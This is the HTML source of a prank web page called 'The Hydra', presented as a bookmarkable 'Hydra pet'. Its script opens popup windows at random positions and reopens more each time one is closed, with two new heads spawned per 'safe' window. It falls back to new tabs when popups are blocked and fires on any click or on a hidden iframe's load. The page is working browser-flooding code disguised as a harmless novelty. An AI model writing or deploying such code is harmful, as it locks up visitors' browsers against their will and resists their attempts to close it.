<html>

<head>
    <title>The Hydra</title>
    <link class='style' rel='stylesheet' href='https://cdn.jsdelivr.net/npm/water.css@2/out/water.css'>
    <meta property="og:title" content="TheHydra" />
    <meta property="og:type" content="website" />
    <meta property="og:url" content="http://minecraftpublisher.github.io/TheHydra" />
    <meta property="og:image" content="http://minecraftpublisher.github.io/TheHydra/favicon.png" />
    <meta property="og:description" content="We Are The Hydra. Cut Off A Head, Three More Appears." />
    <meta name="theme-color" content="#FF0000">
    <link rel='apple-touch-icon' href='./favicon.png'>
    <link rel='shortcut icon' href='./favicon.png'>
</head>

<body onclick="init()">
    <iframe onload="init()" src="./" style="display: none;"></iframe>
    <div class="icon">We Are The Hydra. Cut Off A Head, Three More Appears.<br>Drag this into your bookmarks bar to get your Hydra pet: <a href="javascript:window.open('//minecraftpublisher.github.io/TheHydra');void(0);">TheHydra</a></div>
    <script>
        
        window.clone = new URLSearchParams(window.location.search).get('popup') || 'main'
        
        function interval() {
            const damnson = setInterval(() => {
                if(window.opener === null) {
                    clearInterval(damnson)
                    openNew('safe')
                }
            }, 1000)
        }
        
        function openNew(input) {
            // Main popup loader
            var popup = window.open(window.location.href + '?popup=' + input, '', 'top=' + Math.floor(Math.random() * screen.availHeight) + ',left=' + Math.floor(Math.random() * screen.availWidth) + ',width=350,height=250')
            if(!popup || popup.closed || typeof popup.closed=='undefined') {
                // Produces tab versions until a popup is allowed.
                popup = window.open(window.location.href + '?popup=safe', '_blank')
            }
            
            // Check if a popup is closed, And then load up a new set of heads if it is.
            var popupTick = setInterval(function () {
                if (popup.closed) {
                    clearInterval(popupTick);
                    openNew('safe')
                }
            }, 1000)

            return false
        }
        
        // Check the state of the window.
        function init() {
            if (window.clone === 'main') {
                openNew('safe')
            } else if (window.clone === 'safe') {
                interval()
                openNew('popup')
                openNew('popup')
            } else {
                interval()
            }
        }
    </script>
    <style>
        body {
            display: grid;
            place-items: center;
            text-align: center;
        }
    </style>
</body>

</html>
